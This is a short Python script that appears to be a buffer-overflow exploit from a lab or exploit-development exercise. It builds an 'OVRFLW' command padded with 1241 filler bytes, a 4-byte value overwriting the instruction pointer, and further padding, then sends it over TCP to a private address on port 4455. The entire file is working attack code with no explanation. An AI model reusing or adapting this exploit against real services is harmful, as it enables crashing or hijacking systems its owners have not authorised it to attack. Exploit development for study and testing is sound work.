#!/usr/bin/python    
import socket
import time
import sys

cmd = "OVRFLW "
end = "\r\n"
filler = "A" * 1241
eip = "\x83\x66\x52\x56"
offset  = "C" * 4
inputBuffer = filler + eip + offset
xbuffer = "D" * (2000 - len(filler) - len(eip) - len(offset))
buffer = cmd + inputBuffer + xbuffer + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.21.111", 4455)) 
s.send(buffer)
resp = s.recv(1024)
print(resp)
s.close()